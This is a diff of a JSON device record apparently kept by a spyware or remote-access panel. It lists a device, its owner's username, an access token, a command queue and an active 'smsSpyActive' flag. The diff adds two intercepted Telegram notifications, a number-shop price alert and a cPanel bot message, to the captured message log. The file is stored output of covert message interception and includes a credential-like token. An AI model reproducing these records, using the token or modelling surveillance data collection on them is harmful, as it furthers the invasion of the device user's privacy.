@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777066504451,
+    "lastSeen": 1777066507507,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal Shop Nokos Monitor Harga",
+        "content": "📈 UPDATE HARGA TELEGRAM\n\n📍 Negara: Indonesia\n🕐 Waktu: 25/4/2026, 04.34.47\n📊 Total Server: 109\n📦 Stok Total: 5849\n\n━━━━━━━━━━━━━━━━━━━\n\n🔴 HARGA NAIK!\n\nServer 71\n💰 Rp 1.800 → Rp 2.700\n📈 Naik Rp 900 (50%)\n📊 Rate: 100% | 📦 Stok: 42\n\nServer 72\n💰 Rp 1.550 → Rp 2.650\n📈 Naik Rp 1.100 (71%)\n📊 Rate: 100% | 📦 Stok: 42\n\n━━━━━━━━━━━━━━━━━━━\n\n🎯 ACTION\n• Order sekarang untuk harga terbaik\n• Harga dapat berubah sewaktu-waktu\n• Stok terbatas",
+        "time": "25/04 04:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777066507110
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "⏳ [AUTO-CHECK CPU] - V1\n\nMemulai pengecekan. Mohon tunggu...",
+        "time": "25/04 04:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777066507103
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
